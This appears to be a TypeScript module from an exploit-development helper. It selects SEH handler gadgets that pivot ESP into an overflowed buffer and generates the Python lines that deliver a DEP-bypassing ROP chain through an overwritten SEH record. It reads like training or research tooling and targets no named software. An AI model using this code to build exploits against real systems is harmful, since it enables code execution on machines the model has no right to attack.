import { RopGadget } from "../rop/types";
import { dereferencedRegisters, gadgetAddress, hex32, memoryWrites, sequence, stackMove } from "./dep_plan";

// How the chain reaches its first gadget. Every style builds the same chain either way: what changes is
// where in the payload it starts and what sits around it. A saved EIP takes the chain on the dword it
// overwrites. An SEH record takes it through the handler the dispatcher calls once the overflow faults.
//
// With DEP the classic `pop pop ret` handler cannot be the delivery. It returns into the record itself,
// which is on the stack, and the stack does not execute. The handler has to move ESP into the buffer
// instead, so it is a gadget that adds a large constant to ESP and returns: its `ret` takes the chain's
// first gadget, the way the vulnerable function's `ret` would have.

/** One handler that can take the chain: it adds `land` bytes to the ESP it is called with and returns
 * there, `retn` being its own `ret N`. */
export type SehPivot = { address: number; sequence: string; land: number; retn: number };

export type SehDelivery = {
  /** The first SEH record, on the stack: the payload writes nSEH and the handler there, at OFFSET. */
  record: number;
  /** What the crash left in its handler field, which is in no module: the overflow wrote it. */
  handler: number;
  /** ESP when the dispatcher calls the handler, and the record's distance above it. */
  handlerEsp?: number;
  sehEsp?: number;
  /** How sehEsp was measured, or why it was not, and the commands that measure it by hand. */
  how: string;
  reproduce?: string;
  /** The handlers whose landing is above the faulting ESP and below the record, lowest landing first. */
  pivots: SehPivot[];
  /** Bytes the crash wrote past the handler field, so the payload overwrites as far and faults the same way. */
  tail?: number;
  tailHow: string;
};

export type Delivery = { kind: "ret" } | ({ kind: "seh" } & SehDelivery);

/** A gadget the dispatcher can call as a handler and that returns into the buffer: a fixed stack move,
 * a plain return at the end, and no memory touched but the stack. Which ones land in the buffer depends
 * on where ESP is when it runs, so that is a separate filter. */
export function handlerCandidates(gadgets: RopGadget[], accepted: (address: number) => boolean): SehPivot[] {
  const found: SehPivot[] = [];
  for (const gadget of gadgets) {
    const last = gadget.instructions[gadget.instructions.length - 1];
    const land = stackMove(gadget);
    if (!last || last.mnemonic !== "ret" || land === undefined) continue;
    // A push puts a register where the ret reads, so the gadget returns into that register, not the buffer.
    if (gadget.instructions.some((instruction) => instruction.mnemonic === "push")) continue;
    if (dereferencedRegisters(gadget, "").length > 0 || memoryWrites(gadget, "").length > 0) continue;
    const retn = last.operands.length === 1 ? parseInt(last.operands[0], last.operands[0].indexOf("0x") === 0 ? 16 : 10) || 0 : 0;
    const address = gadgetAddress(gadget);
    if (land - retn <= 0 || !accepted(address) || found.some((pivot) => pivot.address === address)) continue;
    found.push({ address, sequence: sequence(gadget), land: land - retn, retn });
  }
  return found.sort((a, b) => a.land - b.land || a.retn - b.retn || a.address - b.address);
}

/** The handlers whose `ret` reads a dword the overflow wrote: above the ESP the target faulted with,
 * since everything below it is the dispatcher's own frames, and below the record. One per landing. */
export function landingPivots(candidates: SehPivot[], sehEsp: number, faultBelow: number): SehPivot[] {
  return candidates
    .filter((pivot) => pivot.land > faultBelow && pivot.land < sehEsp)
    .filter((pivot, i, all) => all.findIndex((other) => other.land === pivot.land) === i);
}

/** How far past the handler field the crash wrote: the run of the byte right after it. A crash input
 * that is not one repeated byte there leaves this unmeasured, and the file says so rather than guess. */
export function measureTail(record: number, read: (address: number) => number | undefined, limit = 0x4000): { tail?: number; how: string } {
  const start = (record + 8) >>> 0;
  const byte = read(start);
  if (byte === undefined) return { how: `the byte after the handler, at ${hex32(start)}, is unreadable` };
  let length = 0;
  while (length < limit && read((start + length) >>> 0) === byte) length += 1;
  if (length < 4) return { how: `the crash input past the handler at ${hex32(start)} is not a run of one byte` };
  return { tail: length, how: `the crash wrote 0x${length.toString(16).toUpperCase()} bytes of 0x${byte.toString(16).toUpperCase().padStart(2, "0")} past the handler (db ${hex32(start)})` };
}

/** The [6/7] lines that place the chain. `lead` is the Python for the bytes the payload carries below
 * the chain's first gadget: the skeleton's frame, nothing for the other two. */
export function deliveryLines(delivery: Delivery, lead: string, retGap: string): string[] {
  if (delivery.kind === "ret") return ["CHAIN_AT = OFFSET                  # the chain starts on the saved EIP", retGap];
  const pivots = delivery.pivots.length === 0 ? ["SEH_PIVOTS = []"] : [
    "SEH_PIVOTS = [                     # (handler, where its ret lands above that ESP, its ret N), lowest first",
    ...delivery.pivots.map((pivot) => `    (${hex32(pivot.address)}, 0x${pivot.land.toString(16).toUpperCase()}, ${pivot.retn}),${" ".repeat(Math.max(1, 12 - pivot.land.toString(16).length - String(pivot.retn).length))}# ${pivot.sequence}`),
    "]",
  ];
  return [
    "# OFFSET is the nSEH offset: the chain arrives through the SEH handler, a pivot into the buffer below it",
    delivery.sehEsp === undefined ? `SEH_ESP = hole("SEH_ESP")     # ${delivery.how}`
      : `SEH_ESP = 0x${delivery.sehEsp.toString(16).toUpperCase()}${" ".repeat(Math.max(1, 23 - delivery.sehEsp.toString(16).length))}# the record sits this far above ESP when the handler runs: [6/7]`,
    ...pivots,
    delivery.tail === undefined ? `SEH_TAIL = hole("SEH_TAIL")   # ${delivery.tailHow}`
      : `SEH_TAIL = 0x${delivery.tail.toString(16).toUpperCase()}${" ".repeat(Math.max(1, 22 - delivery.tail.toString(16).length))}# bytes the crash wrote past the handler: the payload faults the same way`,
    "def seh_pivot(lead):                # the lowest landing that leaves `lead` bytes of the buffer below the chain",
    "    for handler, land, retn in SEH_PIVOTS:",
    "        if OFFSET - SEH_ESP + land >= lead: return handler, OFFSET - SEH_ESP + land, retn",
    "    hole(\"a handler that lands in the buffer: every pivot lands below its start\")",
    "def seh_record(p):                  # the buffer up to OFFSET, nSEH, the handler, then the bytes past it",
    "    if len(p) > OFFSET: raise SystemExit(\"the payload runs 0x%X bytes into the SEH record\" % (len(p) - OFFSET))",
    "    return p.ljust(OFFSET, PAD) + p32(JUNK) + p32(HANDLER) + PAD * SEH_TAIL",
    `HANDLER, CHAIN_AT, RET_GAP = seh_pivot(${lead})`,
  ];
}

/** What an SEH delivery leaves for [7/7] to list: each number the crash could not give. */
export function sehHoles(delivery: Delivery): string[] {
  if (delivery.kind !== "seh") return [];
  return [
    ...(delivery.sehEsp === undefined ? [`SEH_ESP: ${delivery.how}`] : []),
    ...(delivery.pivots.length === 0 ? ["SEH_PIVOTS: no handler in a module without SafeSEH adds enough to ESP to land in the buffer: dx @$osed().rop.pivots()"] : []),
    ...(delivery.tail === undefined ? [`SEH_TAIL: ${delivery.tailHow}`] : []),
  ];
}
